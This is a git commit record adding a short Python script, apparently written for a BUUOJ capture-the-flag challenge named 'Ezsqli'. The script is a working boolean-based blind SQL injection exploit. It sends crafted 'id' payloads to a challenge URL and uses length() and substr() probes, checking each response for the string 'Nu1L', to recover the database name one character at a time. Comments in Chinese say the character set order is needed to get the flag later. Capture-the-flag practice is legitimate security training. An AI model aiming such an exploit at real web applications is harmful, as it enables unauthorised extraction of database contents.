d0986ab5dab8089b8b554d78bc667724f0211b39
leafairy <liujian9696@outlook.com>
2023-01-24 14:19:44 +0800

    new file:   1.py 	new file:   Ezsqli 1.py

---
+++ Ezsqli 1.py
@@ -0,0 +1,32 @@
+import requests
+
+def get_database(url,strings):
+    database_length = 1
+    DBname = ''
+    for i in range(1,100):
+        data = {
+            'id': "1&&(length(database()))="+str(i)
+        }
+        rs = requests.post(url,data)
+        if 'Nu1L' in rs.text:
+            database_length = i
+            print('数据库长度为：'+str(database_length))
+            break
+    for i in range(1,database_length+1):
+        for one_char in strings:
+            data = {
+                'id': "1&&substr(database()," + str(i) + ",1)='"+str(one_char)+"'"
+            }
+            rs = requests.post(url,data)
+            if 'Nu1L' in rs.text:
+                DBname = DBname + one_char
+                print("\r", end="")
+                print('正在获取数据库名称，当前已获取到'+str(i)+'位 | '+DBname, end='')
+                break
+    print('结束')
+
+if __name__ == '__main__':
+    url = 'http://dd32a85d-4f80-4cbe-a490-44575a952918.node4.buuoj.cn:81/index.php'
+    #不要修改string的顺序，是按asii码排列的，最后获取flag会用到
+    strings = '-./0123456789:;<>=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~#'
+    get_database(url,strings)
